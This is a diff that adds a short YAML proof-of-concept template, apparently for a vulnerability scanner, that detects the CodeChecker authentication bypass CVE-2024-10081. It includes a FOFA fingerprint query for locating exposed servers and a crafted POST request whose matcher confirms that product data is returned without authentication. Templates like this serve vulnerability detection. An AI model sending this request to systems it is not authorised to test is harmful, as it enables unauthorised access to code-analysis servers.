@@ -1,0 +1,17 @@
+id: poc-yaml-codechecker-authentication-bypass
+info:
+  name: CodeChecker 身份认证绕过漏洞(CVE-2024-10081)
+  severity: critical
+  tags:
+  - 权限绕过
+  - CVE-2024-10081
+  finger: codechecker
+  fofa: body="CodeChecker viewer"
+requests:
+- method: POST
+  path: /v6.0/Products/Authentication
+  data: '[1,"getProducts",1,1,{}]'
+  expression: status_code == 200 && contains(body,"\"0\":{\"lst\":[\"rec\",") && !contains(body,"Error
+    code 401\x3a Unauthorized") && contains(content_type,"application/x-thrift")
+variables: {}
+transport: http
